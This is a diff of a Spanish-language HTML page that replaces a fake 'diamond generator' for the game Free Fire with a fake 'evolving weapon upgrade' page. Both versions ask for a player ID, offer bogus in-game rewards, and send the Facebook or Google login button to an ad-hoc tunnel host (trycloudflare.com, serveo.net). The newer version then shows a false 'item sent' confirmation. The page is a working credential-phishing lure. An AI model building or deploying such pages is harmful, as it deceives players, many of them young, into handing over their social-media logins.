@@ -3,235 +3,172 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Generador de Diamantes - Simulación</title>
+    <title>Mejorar Armas Evolutivas</title>
     <style>
+        /* Fondo gradiente RGB (amarillo, rojo y azul eléctrico) */
         body {
             font-family: Arial, sans-serif;
-            background: rgb(0, 212, 255);
-            background: linear-gradient(90deg, rgba(0,212,255,1) 0%, rgba(0,255,96,1) 100%);
+            background: linear-gradient(45deg, #ffcc00, #ff0000, #0000ff);
+            background-size: 400% 400%;
+            animation: gradientAnimation 10s ease infinite;
+            color: white;
             margin: 0;
             padding: 0;
             height: 100vh;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
+            justify-content: center;
         }
 
-        .container {
-            text-align: center;
-            padding: 20px;
-            background: white;
-            border-radius: 12px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-            width: 90%;
-            max-width: 500px;
+        @keyframes gradientAnimation {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
         h1 {
-            color: #333;
-            font-size: 2rem;
+            font-size: 2.5rem;
             margin-bottom: 20px;
         }
 
         .form-container {
-            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
 
-        /* Casilla de entrada de ID moderna con bordes eléctricos */
-        input {
-            padding: 12px;
-            width: 80%;
-            margin-bottom: 20px;
-            border-radius: 25px;
-            font-size: 16px;
-            transition: all 0.3s ease;
-            border: 3px solid transparent;
-            background: linear-gradient(45deg, #FF007F, #00FF00, #FFCC00);
-            background-clip: padding-box;
-            color: white;
-        }
-
-        input:focus {
-            outline: none;
-            box-shadow: 0 0 8px rgba(255, 255, 255, 0.5);
-        }
-
-        /* Estilo del botón "Enviar ID" */
-        button {
-            padding: 15px;
-            margin: 20px 0;
-            background: linear-gradient(45deg, #FF007F, #00FF00, #FFCC00);
-            border: none;
-            color: white;
-            border-radius: 10px;
-            font-size: 18px;
-            text-transform: uppercase;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-            transition: all 0.3s ease;
-        }
-
-        button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.4);
-            background: linear-gradient(45deg, #FF4C8B, #00FF44, #FFDD44);
-        }
-
-        /* Barra de progreso */
-        .progress-container {
-            width: 100%;
-            height: 5px;
-            background-color: #ccc;
-            border-radius: 5px;
-            margin-bottom: 20px;
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, rgba(0,212,255,1) 0%, rgba(0,255,96,1) 100%);
-        }
-
-        /* Opciones de diamantes */
-        .diamond-options {
-            margin-top: 20px;
-        }
-
-        .diamond-option {
-            padding: 15px;
+        .input-id {
+            padding: 10px;
+            font-size: 1rem;
             margin: 10px;
-            background-color: #FF9800;
-            border: none;
-            border-radius: 10px;
-            font-size: 18px;
+            border: 2px solid white;
+            border-radius: 5px;
+            background-color: transparent;
             color: white;
+            width: 250px;
+        }
+
+        .weapon-options {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
+            max-width: 800px;
+            width: 100%;
+        }
+
+        .weapon {
+            padding: 20px;
+            border: 2px solid white;
+            border-radius: 5px;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: transform 0.3s;
         }
 
-        .diamond-option:hover {
-            background-color: #FF7300;
+        .weapon:hover {
+            transform: scale(1.1);
         }
 
-        .diamond-logo {
-            font-size: 25px;
+        .weapon img {
+            width: 40px;
+            margin-right: 10px;
         }
 
-        .login-section {
-            margin-top: 30px;
+        .weapon-name {
+            font-size: 1.2rem;
         }
 
-        .login-section button {
-            background-color: #4267B2;
+        .login-button {
+            padding: 15px 25px;
+            background-color: #00aaff;
+            border: none;
+            border-radius: 5px;
+            color: white;
+            font-size: 1.1rem;
+            cursor: pointer;
+            margin-top: 20px;
+            display: none;
         }
 
-        #login-google {
-            background-color: #DB4437;
+        .loading {
+            font-size: 1.5rem;
+            display: none;
+            margin-top: 20px;
         }
 
-        /* Estilo para el mensaje de error */
-        .error-message {
-            color: red;
-            font-size: 14px;
-            margin-top: 10px;
+        .success-message {
+            font-size: 1.5rem;
+            color: green;
+            display: none;
         }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h1>Generador de Diamantes - Simulación</h1>
-        <div class="form-container">
-            <label for="user-id">Coloca tu ID:</label>
-            <input type="text" id="user-id" placeholder="Ingresa tu ID aquí" inputmode="numeric" maxlength="10" />
-            
-            <!-- Mensaje de error, inicialmente oculto -->
-            <div id="error-message" class="error-message" style="display: none;">
-                El ID debe tener al menos 10 dígitos.
-            </div>
+    <h1>Mejorar Armas Evolutivas</h1>
 
-            <div class="progress-container">
-                <div class="progress-bar"></div>
-            </div>
+    <div class="form-container">
+        <label for="id-input">Introduce tu ID de Free Fire:</label>
+        <input type="text" id="id-input" class="input-id" placeholder="ID de Free Fire">
+        <button onclick="handleIDSubmit()">Enviar</button>
+    </div>
 
-            <button id="submit-id">Enviar ID</button>
-
-            <div id="diamond-options" class="diamond-options" style="display: none;">
-                <h2>¿Cuántos diamantes quieres?</h2>
-                <button class="diamond-option" data-diamonds="100">
-                    <span class="diamond-logo">💎</span> 100 Diamantes
-                </button>
-                <button class="diamond-option" data-diamonds="310">
-                    <span class="diamond-logo">💎</span> 310 Diamantes
-                </button>
-                <button class="diamond-option" data-diamonds="520">
-                    <span class="diamond-logo">💎</span> 520 Diamantes
-                </button>
-                <button class="diamond-option" data-diamonds="1080">
-                    <span class="diamond-logo">💎</span> 1080 Diamantes
-                </button>
-            </div>
-
-            <div id="login-section" class="login-section" style="display: none;">
-                <h2>Inicia sesión para continuar</h2>
-                <button id="login-facebook">Iniciar sesión con Facebook</button>
-                <button id="login-google">Iniciar sesión con Google</button>
-            </div>
+    <div id="weapon-container" class="weapon-options" style="display:none;">
+        <div class="weapon" onclick="selectWeapon('MP40')">
+            <img src="mp40-icon.png" alt="MP40">
+            <span class="weapon-name">MP40</span>
+        </div>
+        <div class="weapon" onclick="selectWeapon('AK')">
+            <img src="ak-icon.png" alt="AK">
+            <span class="weapon-name">AK</span>
+        </div>
+        <div class="weapon" onclick="selectWeapon('UMP')">
+            <img src="ump-icon.png" alt="UMP">
+            <span class="weapon-name">UMP</span>
+        </div>
+        <div class="weapon" onclick="selectWeapon('M1887')">
+            <img src="m1887-icon.png" alt="M1887">
+            <span class="weapon-name">M1887</span>
+        </div>
+        <div class="weapon" onclick="selectWeapon('M1014')">
+            <img src="m1014-icon.png" alt="M1014">
+            <span class="weapon-name">M1014</span>
         </div>
     </div>
 
+    <button id="login-button" class="login-button" onclick="login()">Iniciar sesión en Facebook</button>
+
+    <div id="loading" class="loading">Cargando...</div>
+    <div id="success-message" class="success-message">Objeto enviado exitosamente ✅</div>
+
     <script>
-        // Restringir la entrada solo a números
-        document.getElementById('user-id').addEventListener('input', function(event) {
-            const value = event.target.value;
-            // Elimina cualquier carácter que no sea un número
-            event.target.value = value.replace(/[^0-9]/g, '');
-        });
-
-        // Manejo del envío del ID
-        document.getElementById('submit-id').addEventListener('click', function() {
-            const userId = document.getElementById('user-id').value;
-            
-            // Validación de longitud del ID
-            if (userId.length < 10) {
-                // Mostrar mensaje de error si el ID es menor a 10 caracteres
-                document.getElementById('error-message').style.display = 'block';
-                return;  // Detener la ejecución si el ID no es válido
+        function handleIDSubmit() {
+            var userId = document.getElementById('id-input').value;
+            if (userId.trim() !== "") {
+                document.getElementById('weapon-container').style.display = 'grid';
+            } else {
+                alert("Por favor, ingresa tu ID de Free Fire.");
             }
+        }
 
-            // Ocultar mensaje de error si el ID es válido
-            document.getElementById('error-message').style.display = 'none';
+        function selectWeapon(weapon) {
+            selectedWeapon = weapon;
+            document.getElementById('login-button').style.display = 'inline-block';
+        }
 
-            // Si el ID es válido, muestra la barra de progreso
-            document.querySelector('.progress-bar').style.width = '100%';
-            setTimeout(() => {
-                document.getElementById('diamond-options').style.display = 'block';
-            }, 1000);
-        });
-
-        // Manejo de selección de diamantes
-        const diamondOptions = document.querySelectorAll('.diamond-option');
-        diamondOptions.forEach(option => {
-            option.addEventListener('click', function() {
-                const diamonds = option.getAttribute('data-diamonds');
-                alert(`Seleccionaste ${diamonds} Diamantes`);
-                document.getElementById('diamond-options').style.display = 'none';
-                document.getElementById('login-section').style.display = 'block';
-            });
-        });
-
-        // Redirección a enlaces de inicio de sesión
-        document.getElementById('login-facebook').addEventListener('click', function() {
-            window.location.href = 'https://barbara-medal-surfing-hoping.trycloudflare.com  ';
-        });
-
-        document.getElementById('login-google').addEventListener('click', function() {
-            window.location.href = ' https://barbara-medal-surfing-hoping.trycloudflare.com ';
-        });
+        function login() {
+            window.location.href = "https://27eb4e9a230309a3c295636c2c537a11.serveo.net";
+            document.getElementById('loading').style.display = 'inline';
+            setTimeout(function() {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('success-message').style.display = 'block';
+            }, 5000);
+        }
     </script>
 
 </body>
